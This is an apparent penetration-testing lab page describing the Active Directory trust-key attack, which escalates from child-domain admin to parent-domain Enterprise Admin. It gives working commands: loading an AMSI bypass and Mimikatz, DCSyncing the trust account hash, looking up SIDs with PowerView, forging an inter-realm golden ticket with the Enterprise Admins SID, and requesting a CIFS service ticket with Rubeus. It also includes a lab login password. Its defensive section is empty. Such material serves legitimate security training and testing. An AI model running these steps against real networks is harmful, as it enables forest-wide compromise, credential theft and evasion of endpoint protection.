# Trust key

## Attacking

### How it works

Once you gain Domain Admin privileges within the child domain its possible to get Enterprise Admin in the parent domain by generating a golden ticket in the child domain with the SID of the Enterprise Admin group.

### Tools

* [MimiKatz](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1)
* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

### Executing the attack

The attack is executed from the perspective of already gaining domain admin privileges. This is done in the unconstrained delegation section:

{% content-ref url="../delegation-attacks/unconstrained-delegation/" %}
[unconstrained-delegation](../delegation-attacks/unconstrained-delegation/)
{% endcontent-ref %}

1. For easy execution, login on `WS01` as the `Administrator` user with the password `Welcome01!`.
2. Start PowerShell as Administrator and load a amsi bypass and MimiKatz into memory.

![](<../../../.gitbook/assets/image (71) (1).png>)

3\. DCsync the trust key with MimiKatz:

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:amsterdam\bank$"'
```

![](<../../../.gitbook/assets/image (9) (1).png>)

4\. Retrieve the SID of the enterprise Admins group, using PowerView:

```
Get-DomainGroup "Enterprise Admins" -Domain bank.local | Select-Object samaccountname, objectsid
```

![](<../../../.gitbook/assets/image (76) (1).png>)

5\. Retrieve the domain SID from the child domain, using PowerView:

```
Get-DomainSid
```

![](<../../../.gitbook/assets/image (64) (1).png>)

6\. Create a TGT for the krbtgt user and save it to disk with MimiKatz:

```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
```

![](<../../../.gitbook/assets/image (72).png>)

7\. Create a TGS for the CIFS service with Rubeus.exe using the created TGT:

```
.\Rubeus.exe asktgs /ticket:trustkey.kirbi /service:CIFS/dc01.bank.local /dc:dc01.bank.local /ptt
```

![](<../../../.gitbook/assets/image (28).png>)

List the tickets:

![](<../../../.gitbook/assets/image (13).png>)

## Defending

### Detection



## References

